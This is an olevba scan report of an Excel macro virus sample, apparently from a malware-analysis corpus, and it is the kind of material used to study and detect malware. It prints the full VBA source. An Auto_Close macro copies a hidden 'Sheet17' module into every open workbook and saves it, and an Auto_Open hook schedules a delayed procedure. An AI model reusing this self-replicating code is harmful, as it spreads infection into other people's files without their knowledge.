olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rawo-ab851257b0128cbe9416ec86fc22c6b7b5121e66
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSWord.Rawo-ab851257b0128cbe9416ec86fc22c6b7b5121e66 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSWord.Rawo-ab851257b0128cbe9416ec86fc22c6b7b5121e66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSWord.Rawo-ab851257b0128cbe9416ec86fc22c6b7b5121e66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSWord.Rawo-ab851257b0128cbe9416ec86fc22c6b7b5121e66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet17.bas 
in file: Virus.MSWord.Rawo-ab851257b0128cbe9416ec86fc22c6b7b5121e66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnTime Now + TimeValue("00:30:00"), "my_Procedure"
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim AroFlag As Boolean
    Dim Aro As Object
    On Error GoTo 0
    'MsgBox Workbooks.Count
    'MsgBox Workbooks.Item(3).Name
    
    For NumWork = 1 To Workbooks.Count
        AroFlag = False
        Set Aro = Workbooks(Workbooks.Item(NumWork).Name)
        For n = 1 To Aro.Sheets.Count
            
            If Aro.Sheets.Item(n).Name = "Sheet17" Then
                AroFlag = True
                Exit For
            End If
        Next
        If AroFlag = False Then
            Sheets("Sheet17").Visible = True
            Sheets("Sheet17").Copy Workbooks(Aro.Name).Sheets(Aro.Sheets.Count)
            Workbooks(Aro.Name).Sheets("Sheet17").Visible = False
            Workbooks(Aro.Name).Save
        End If
    Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Sheet1
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

